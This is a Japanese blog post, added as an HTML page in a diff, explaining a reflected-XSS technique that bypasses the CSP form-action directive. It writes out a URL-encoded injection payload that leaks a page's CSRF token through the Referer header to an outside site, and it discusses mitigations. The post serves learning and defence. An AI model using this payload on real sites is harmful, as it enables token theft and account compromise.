@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>form-actionを使ったCSPのXSS攻撃手法を学んだ | 69log</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XSS攻撃の検出と軽減手法としてCSP(Content Security Policy)を設定することはよく取られている手法。しかし、これは決して万全ではないということを改めて学んだ。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="form-actionを使ったCSPのXSS攻撃手法を学んだ">
+<meta property="og:url" content="http://blog.kazu69.net/2016/09/10/protect-bypass-form-action-reflected-xss/index.html">
+<meta property="og:site_name" content="69log">
+<meta property="og:description" content="XSS攻撃の検出と軽減手法としてCSP(Content Security Policy)を設定することはよく取られている手法。しかし、これは決して万全ではないということを改めて学んだ。">
+<meta property="og:updated_time" content="2016-09-16T14:52:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="form-actionを使ったCSPのXSS攻撃手法を学んだ">
+<meta name="twitter:description" content="XSS攻撃の検出と軽減手法としてCSP(Content Security Policy)を設定することはよく取られている手法。しかし、これは決して万全ではないということを改めて学んだ。">
+  
+    <link rel="alternative" href="/atom.xml" title="69log" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-9196861-14', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+</head>
+<body>
+    <header role="header">
+  <div class="header cf">
+    <div class="title-content">
+      <h1>
+        <a href="/">69log</a>
+      </h1>
+      
+        <h2>
+          <a href="/">福岡でwebの仕事をしています</a>
+        </h2>
+      
+    </div>
+
+    <div class="nav-content cf">
+      <nav>
+        
+          <a href="/" class="nav-link nav-home">home</a>
+        
+          <a href="/archives" class="nav-link nav-archives">archives</a>
+        
+        
+          <a href="/atom.xml" title="RSS Feed" class="icon nav-link nav-feed"></a>
+        
+      </nav>
+      <div class="header-search">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><input type="hidden" name="sitesearch" value="http://blog.kazu69.net"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+    <main role="main" id="main">
+      <section><article id="post-protect-bypass-form-action-reflected-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <header class="article-header">
+    
+      
+  
+    <h1 class="article-title" itemprop="name">
+      form-actionを使ったCSPのXSS攻撃手法を学んだ
+    </h1>
+  
+
+    
+    <div class="article-meta clr">
+      <time datetime="2016-09-09T16:23:00.000Z" itemprop="datePublished">2016-09-10</time>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+
+    </div>
+  </header>
+
+  <div class="article-entry" itemprop="articleBody">
+    <div class="article-gallery">
+      
+    </div>
+    
+      <p>XSS攻撃の検出と軽減手法として<a href="https://developer.mozilla.org/ja/docs/Web/Security/CSP" target="_blank" rel="external">CSP(Content Security Policy)</a>を設定することはよく取られている手法。<br>しかし、これは決して万全ではないということを改めて学んだ。</p>
+<a id="more"></a>
+<p>CSP(Content Security Policy)をでのXSSの事例を掲載している<a href="https://swehack.org/viewtopic.php?t=1504" target="_blank" rel="external">Bypassa CSP form-action och referrer</a>の記事が興味深かった。</p>
+<p><a href="https://developer.mozilla.org/ja/docs/Web/Security/CSP/Using_Content_Security_Policy" target="_blank" rel="external">CSP(Content Security Policy)</a>とはMDNにある通り</p>
+<blockquote>
+<p>Content Security Policy の設定とは、Web ページに対する Content-Security-Policy HTTP ヘッダの付加、またそのページ上でユーザエージェントが読み込むリソースを制限する値の設定に他なりません。</p>
+</blockquote>
+<p>ということで指定したポリシーに基づきリソースの取扱うため、XSS Injectionなどの攻撃を軽減できる。</p>
+<p>例えば form-action ディレクティブを設定することで許可する送信先を設定できる。</p>
+<p>次のようにcspを設定をしている場合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy:default-src &apos;self&apos;; form-action &apos;self&apos;; report-uri /csp-reports/</div></pre></td></tr></table></figure>
+<p>外部スクリプトを実行しようとすると、実行されないでレポートが送られる。<br>また、form-action ディレクティブを追加してももちろん、許可サイト以外へのPOSTは拒否される。<br>(default-srcは基本全ディレクティブに対して設定される)</p>
+<p>例えば、次のようなフォームの場合、送信先が許可されていないため送信できない。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"https://google.com/"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrftoken"</span> <span class="attr">value</span>=<span class="string">"randomcsrftoken"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"scubscribe"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>またレポート設定をしている場合は違反事象が報告される。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;csp-report&quot;=&gt;&#123;&quot;document-uri&quot;=&gt;&quot;http://localhost:4567/unsafe/&quot;, &quot;referrer&quot;=&gt;&quot;&quot;, &quot;violated-directive&quot;=&gt;&quot;form-action &apos;self&apos;&quot;, &quot;effective-directive&quot;=&gt;&quot;form-action&quot;, &quot;original-policy&quot;=&gt;&quot;default-src &apos;self&apos;; form-action &apos;self&apos;; report-uri /csp-reports/&quot;, &quot;blocked-uri&quot;=&gt;&quot;http://google.com&quot;, &quot;status-code&quot;=&gt;200&#125;&#125;</div></pre></td></tr></table></figure>
+<p>次のようにformタグがinjectionされた場合</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">”https://google.com/</span>"&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"/subscribe/"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrftoken"</span> <span class="attr">value</span>=<span class="string">"randomcsrftoken"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"scubscribe"</span>&gt;</span></div><div class="line">     <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>このフォームがPOSTされるとフォームの内容がすべてGETされURLパラメータに渡される。<br>もちろんCSPのレポートにも報告される。</p>
+<p>このパラメーター付きのGETリクエストがリファラーに送られるとtokenなども任意のサイトに送ることが可能になる。<br>例えばフォームタグの出現前になにかしらの入力値を出力する箇所があり、そこからhtmlが注入できた場合、<br>(例としてはありえないけどGETで渡された値をそのまま出力している場合)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?xss=%3Cinput%20value%3D%22Click%20Me%22%20type%3D%22submit%22%20formaction%3D%22%22%20form%3D%22subscribe%22%20formmethod%3D%22get%22%20%2F%3E%3Cinput%20type%3D%22hidden%22%20value%3D%22%3Cmeta%20name%3D%27referrer%27%20content%3D%27always%27%3E%22%3E"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>上記のようなリンクを踏ませて、任意のsubmitボタンをページに注入する。<br>その場合のコードは以下のようになる。<br>(わかりやすくするために適宜改行を入れている)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"Click Me"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">formaction</span>=<span class="string">""</span> <span class="attr">form</span>=<span class="string">"subscribe"</span> <span class="attr">formmethod</span>=<span class="string">"get"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"&lt;meta name='referrer' content='always'&gt;"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/subscribe/"</span> <span class="attr">id</span>=<span class="string">"subscribe"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"csrftoken"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"randomcsrftoken"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"scubscribe"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>inputタグにはhtml5から追加された<a href="https://www.w3.org/TR/html5/forms.html#attr-fae-form" target="_blank" rel="external">form属性</a>、<a href="https://www.w3.org/TR/html5/forms.html#attr-fs-formaction" target="_blank" rel="external">formaction属性</a>、<a href="https://www.w3.org/TR/html5/forms.html#attr-fs-formmethod" target="_blank" rel="external">formmethod属性</a>を使ってformをpostできるようにする。<br>また、リファラを送るようにメタタグを追加しているのがキモらしい。</p>
+<p>このボタンを押すことで、フォームの内容がリファラを通して任意のサイトに送られる。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer:http://YOURSITE.COM/?xss=%3Cinput%20value%3D%22Click%20Me%22%20type%3D%22submit%22%20formaction%3D%22%22%20form%3D%22subscribe%22%20formmethod%3D%22get%22%20%2F%3E%3Cinput%20type%3D%22hidden%22%20value%3D%22%3Cmeta%20name%3D%27referrer%27%20content%3D%27always%27%3E%22%3E</div></pre></td></tr></table></figure>
+<p>この手法はCSPでのレポートは報告されない。<br>攻撃手法がReflected XSS(反射型XSS)ということで、<a href="https://www.w3.org/TR/2012/WD-CSP11-20121213/#relationship-to-x-xss-protection" target="_blank" rel="external">X-XSS-Protection</a>を有効にしているとinjectionされたinputボタンは有効化しない。</p>
+<p>CSPである程度のXSSは軽減できると思っていたが、それなりに攻撃手法もあるものですね。<br>header周りのセキュリティも合わせて行うことが必要ということが身にしみる感じになる。</p>
+<p>ちなみにGitHubはこのあたりのことから、formタグの前にコメントを入れて少しでも軽減できるようにしているみたいです。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- &lt;/textarea&gt; --&gt;</span><span class="comment">&lt;!-- '"` --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">accept-charset</span>=<span class="string">"UTF-8"</span> <span class="attr">action</span>=<span class="string">"/kazu69/XXX/search"</span> <span class="attr">class</span>=<span class="string">"js-site-search-form"</span> <span class="attr">data-scoped-search-url</span>=<span class="string">"/kazu69/page-data-cli/search"</span> <span class="attr">data-unscoped-search-url</span>=<span class="string">"/search"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>今回はSinatraで試しました。<a href="https://gist.github.com/kazu69/c0262196c49f4a8fdf3f7e9f3889ca41" target="_blank" rel="external">ソースはこちらにあります</a>。</p>
+<h3 id="参考にしたページ"><a href="#参考にしたページ" class="headerlink" title="参考にしたページ"></a>参考にしたページ</h3><p><a href="https://swehack.org/viewtopic.php?t=1504" target="_blank" rel="external">Bypassa CSP form-action och referrer</a><br><a href="https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/" target="_blank" rel="external">CSP: bypassing form-action with reflected XSS</a><br><a href="https://chloe.re/2016/07/19/protect-against-html-extraction/" target="_blank" rel="external">Protect against HTML-extraction</a></p>
+
+    
+  </div>
+
+  
+    <footer class="article-footer">
+
+      
+        <aside class="google-adsence">
+          
+<!-- Google Adsence -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+   style="display:block"
+   data-ad-client="ca-pub-4054575508733221"
+   data-ad-slot="9493597992"
+   data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<!-- End Google Adsence -->
+
+
+        </aside>
+      
+
+      <div class="share_content">
+  <div class="hatena_sharebox">
+    
+      <a href="http://b.hatena.ne.jp/entry/blog.kazu69.net/2016/09/10/protect-bypass-form-action-reflected-xss/" class="hatena-bookmark-button" data-hatena-bookmark-title="form-actionを使ったCSPのXSS攻撃手法を学んだ" data-hatena-bookmark-layout="standard-balloon" data-hatena-bookmark-lang="ja" title="このエントリーをはてなブックマークに追加"><img src="https://b.st-hatena.com/images/entry-button/button-only@2x.png" alt="このエントリーをはてなブックマークに追加" width="20" height="20" style="border: none;"></a><script src="https://b.st-hatena.com/js/bookmark_button.js" charset="utf-8" async="async"></script>
+    
+  </div>
+  
+    <div class="addthis addthis_toolbox addthis_default_style">
+      
+        <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+      
+      
+        <a class="addthis_button_tweet"></a>
+      
+      
+        <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+      
+      
+      <!-- <a class="addthis_counter addthis_pill_style"></a> -->
+    </div>
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-55a4f49a45ced975"></script>
+  
+</div>
+
+      
+        <a href="http://blog.kazu69.net/2016/09/10/protect-bypass-form-action-reflected-xss/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  
+
+  
+    
+<nav id="article-nav">
+  <div class="article-nav">
+    
+      <a href="/2016/09/14/using-at-rule-supports-development-with-css-property-of-future/" id="article-nav-newer" class="article-nav-link article-nav-link-newer">
+        <span class="article-nav-caption">Newer - </span>
+        <span class="article-nav-title">
+          
+            Supportsルールを使って未来のcssプロパティに備えた開発
+          
+        </span>
+      </a>
+    
+    
+      <a href="/2016/08/23/target-blank-vulnerability-tabnabbing-and-countermeasures/" id="article-nav-older" class="article-nav-link article-nav-link-older">
+        <span class="article-nav-caption">Older - </span>
+        <span class="article-nav-title">
+          
+            target=&quot;_blank&quot;を使った脆弱性Tabnabbingとその対策
+          
+        </span>
+        </span>
+      </a>
+    
+  </div>
+</nav>
+
+  
+</article>
+
+
+<section class="comments" id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</section>
+      
+    </main>
+    <footer id="footer" role="contentinfo">
+  
+  <div class="footer-cotent">
+    <small>&copy; 2016 kazu69</small>
+    <span class="generator">Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+  </div>
+</footer>
+    
+<script>
+  var disqus_shortname = '69log';
+  
+  var disqus_url = 'http://blog.kazu69.net/2016/09/10/protect-bypass-form-action-reflected-xss/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+</body>
+</html>
